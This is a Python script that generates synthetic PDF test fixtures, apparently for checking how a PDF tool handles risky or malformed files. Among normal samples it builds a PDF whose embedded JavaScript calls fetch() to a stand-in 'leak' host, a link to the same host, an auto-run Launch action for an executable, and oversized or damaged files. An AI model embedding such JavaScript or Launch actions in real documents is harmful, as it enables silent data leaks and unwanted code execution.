"""Reproducible synthetic PDF inputs, no user data; bundled reportlab/pypdf/Pillow."""
from pathlib import Path
from io import BytesIO
from reportlab.pdfgen import canvas
from reportlab import rl_config
from reportlab.lib.pagesizes import A4, letter, landscape
from reportlab.lib.utils import ImageReader
from pypdf import PdfReader, PdfWriter
from pypdf.generic import DictionaryObject, NameObject, TextStringObject, ArrayObject, NumberObject, DecodedStreamObject

root = Path(__file__).parent / "pdfs"
rl_config.useA85 = 0
root.mkdir(exist_ok=True)
images = Path(__file__).parent / "images"
def create(name, sizes):
    pdf = canvas.Canvas(str(root / name), invariant=1, pageCompression=1)
    for index, size in enumerate(sizes):
        pdf.setPageSize(size)
        pdf.setFillColorRGB(0.9, 0.15, 0.2) if index == 0 else pdf.setFillColorRGB(0.1, 0.4, 0.9)
        pdf.rect(40, 80, 180, 80, fill=1, stroke=0)
        pdf.setFillColorRGB(0, 0, 0)
        pdf.setFont("Helvetica", 16)
        pdf.drawString(40, size[1]-50, f"SYNTHETIC {name} PAGE {index+1}")
        pdf.drawImage(ImageReader(str(images / "landscape.jpg")), 40, 200, 240, 120)
        pdf.showPage()
    pdf.save()
create("a4.pdf", [A4, landscape(A4)])
create("split-pages.pdf", [A4, landscape(A4), letter, A4, letter])
large_split = canvas.Canvas(str(root / "split-large-output.pdf"), invariant=1, pageCompression=1)
large_split_image = ImageReader(str(images / "noise-2000.jpg"))
for index in range(5):
    large_split.setPageSize(letter)
    large_split.setFont("Helvetica", 16)
    large_split.drawString(40, 740, f"SYNTHETIC SPLIT OUTPUT LIMIT PAGE {index + 1}")
    large_split.rect(40, 80, 180, 80, fill=1, stroke=0)
    large_split.drawImage(large_split_image, 40, 200, 500, 375)
    large_split.showPage()
large_split.save()
writer = PdfWriter(clone_from=root / "split-pages.pdf")
writer.pages[1].rotate(90)
writer.pages[3].rotate(270)
writer.pages[3].cropbox.lower_left = (12, 20)
writer.pages[3].cropbox.upper_right = (580, 760)
writer.write(root / "split-pages.pdf")
create("letter.pdf", [letter])
writer = PdfWriter(clone_from=root / "letter.pdf")
writer.pages[0].rotate(90)
writer.pages[0].cropbox.lower_left = (12, 20)
writer.pages[0].cropbox.upper_right = (580, 760)
writer.write(root / "rotated.pdf")
writer = PdfWriter(clone_from=root / "letter.pdf")
writer.encrypt("synthetic-password", algorithm="RC4-128")
writer.write(root / "encrypted.pdf")
writer = PdfWriter(clone_from=root / "letter.pdf")
writer.add_js("app.alert('SYNTHETIC'); fetch('https://example.invalid/leak');")
writer.write(root / "javascript.pdf")
writer = PdfWriter(clone_from=root / "letter.pdf")
writer.add_attachment("synthetic.txt", b"synthetic only")
writer.write(root / "attachment.pdf")
writer = PdfWriter(clone_from=root / "letter.pdf")
writer.add_annotation(0, DictionaryObject({NameObject("/Type"):NameObject("/Annot"),NameObject("/Subtype"):NameObject("/Link"),NameObject("/Rect"):ArrayObject([]),NameObject("/A"):DictionaryObject({NameObject("/S"):NameObject("/URI"),NameObject("/URI"):TextStringObject("https://example.invalid/leak")})}))
writer.write(root / "link.pdf")
writer = PdfWriter(clone_from=root / "letter.pdf")
writer._root_object[NameObject("/AcroForm")] = DictionaryObject({NameObject("/Fields"):ArrayObject([])})
writer.write(root / "form.pdf")
writer = PdfWriter(clone_from=root / "letter.pdf")
writer._root_object[NameObject("/OpenAction")] = DictionaryObject({NameObject("/S"):NameObject("/Launch"),NameObject("/F"):TextStringObject("synthetic.exe")})
writer.write(root / "launch.pdf")
writer = PdfWriter(clone_from=root / "letter.pdf")
group = writer._add_object(DictionaryObject({NameObject("/Type"):NameObject("/OCG"),NameObject("/Name"):TextStringObject("Synthetic hidden layer")}))
writer._root_object[NameObject("/OCProperties")] = DictionaryObject({NameObject("/OCGs"):ArrayObject([group]),NameObject("/D"):DictionaryObject({NameObject("/BaseState"):NameObject("/OFF"),NameObject("/OFF"):ArrayObject([group]),NameObject("/Order"):ArrayObject([group])})})
page = writer.pages[0]
page["/Resources"].get_object()[NameObject("/Properties")] = DictionaryObject({NameObject("/SyntheticLayer"):group})
stream = DecodedStreamObject()
stream.set_data(b"/OC /SyntheticLayer BDC\n" + page.get_contents().get_data() + b"\nEMC\n")
page[NameObject("/Contents")] = writer._add_object(stream)
writer.write(root / "layers.pdf")
writer = PdfWriter(clone_from=root / "letter.pdf")
writer._root_object[NameObject("/SyntheticHugeNumber")] = NumberObject(123456789012345678901234567890)
writer.write(root / "large-number.pdf")
writer = PdfWriter()
for index in range(101): writer.add_blank_page(612, 792)
writer.write(root / "too-many-pages.pdf")
writer = PdfWriter()
writer.write(root / "empty-pages.pdf")
(root / "damaged.pdf").write_bytes(b"%PDF-1.7\nnot a document\n%%EOF\n")
for width in [800, 2000, 4000]:
    pdf = canvas.Canvas(str(root / f"image-{width}.pdf"), invariant=1, pageCompression=1)
    pdf.drawImage(ImageReader(str(images / f"noise-{width}.jpg")), 0, 0, 595, 446)
    pdf.showPage(); pdf.save()
